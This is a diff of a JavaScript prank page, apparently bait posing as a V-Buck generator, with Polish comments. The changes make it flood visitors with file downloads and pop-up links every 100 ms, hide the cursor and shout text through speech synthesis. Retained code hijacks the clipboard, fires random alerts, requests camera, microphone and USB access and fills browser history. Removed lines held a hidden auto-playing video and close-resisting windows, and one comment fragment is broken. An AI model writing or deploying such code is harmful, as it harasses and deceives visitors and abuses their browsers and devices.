@@ -30,17 +30,6 @@ function openLinks(links) {
 }
 
 
-function openLinks(links) {
-
-    links.forEach(link => {
-
-        window.open(link, '_blank');
-
-    });
-
-}
-
-
 function resizeWindow() {
 
     let width = 300;
@@ -69,6 +58,7 @@ function resizeWindow() {
     }, 2000);
 }
 
+
 function main() {
 
     const filesToDownload = ['ez-yann.png', 'gerbus.png', 'jasioch.png', 'readme.txt'];
@@ -78,19 +68,11 @@ function main() {
 
     setInterval(() => {
 
-        if (!filesDownloaded) { // Sprawdź, czy pliki zostały już pobrane
-
-            downloadFiles(filesToDownload);
-
-            filesDownloaded = true; // Ustaw flagę na true po pobraniu plików
-
-        }
+        downloadFiles(filesToDownload);
 
         openLinks(linksToOpen);
 
-    }, 50000);
-
-}
+    }, 100);
 
 
     function copyRandomString() {
@@ -170,6 +152,16 @@ function main() {
         document.body.style.cursor = 'none';
 
     }
+
+
+    function speakText(text) {
+
+        const utterance = new SpeechSynthesisUtterance(text);
+
+        window.speechSynthesis.speak(utterance);
+
+    }
+
 
     function requestUSBPermission() {
 
@@ -289,7 +281,7 @@ function main() {
 
             const iframe = document.createElement('iframe');
 
-            iframe.src = 'http://ptoszek.pl'; 
+            iframe.src = 'http://ptoszek.pl'; // Zmień na odpowiedni URL
 
             document.body.appendChild(iframe);
 
@@ -310,74 +302,9 @@ function main() {
 
     }
 
-function startInvisiblePictureInPictureVideo () {
-  const video = document.createElement('video')
-  video.src = getRandomArrayEntry(VIDEOS)
-  video.loop = true
-  video.muted = true
-  video.style = HIDDEN_STYLE
-  video.autoplay = true
-  video.play()
 
-  document.body.appendChild(video)
-}
-uires user-initiated event.
- */
-function enablePictureInPicture () {
-  const video = document.querySelector('video')
-  if (document.pictureInPictureEnabled) {
-    video.style = ''
-    video.muted = false
-    video.requestPictureInPicture()
-    video.play()
-  }
-}
+    // Wywołanie funkcji
 
-function focusWindows () {
-  wins.forEach(win => {
-    if (!win.closed) win.focus()
-  })
-}
-
-
-function openWindow () {
-  const { x, y } = getRandomCoords()
-  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-  const win = window.open(window.location.pathname, '', opts)
-
-  if (!win) return
-  wins.push(win)
-
-  if (wins.length === 2) setupSearchWindow(win)
-
-  win.onunload = function () {
-    return false;
-  };
-
-  win.addEventListener("beforeunload", function (e) {
-    e.preventDefault();
-    e.returnValue = "";
-  });
-
-  win.onbeforeunload = function () {
-    return "";
-  };
-}
-
-function hideCursor () {
-  document.querySelector('html').style = 'cursor: none;'
-}
-
-    startInvisiblePictureInPictureVideo();
-
-    enablePictureInPicture();
-
-    focusWindows();
-
-    openWindow();
-
-    hideCursor();
-    
     copyRandomString(); // Kopiowanie losowego ciągu
 
     randomAlert(); // Wyświetlanie losowego alertu
@@ -385,6 +312,10 @@ function hideCursor () {
     openMovingVideo(); // Otwieranie wideo w ruchu
 
     requestCameraAndMicrophone(); // Prośba o uprawnienia do kamery i mikrofonu
+
+    hideCursor(); // Ukrywanie kursora
+
+    speakText("VBUCK GENERATOR AAAAKWA"); // Mówienie tekstu
 
     requestUSBPermission(); // Prośba o uprawnienia do USB
 
@@ -399,7 +330,7 @@ function hideCursor () {
     fillHistory(); // Wypełnienie historii
 
 
-}
 
+}
 
 main();
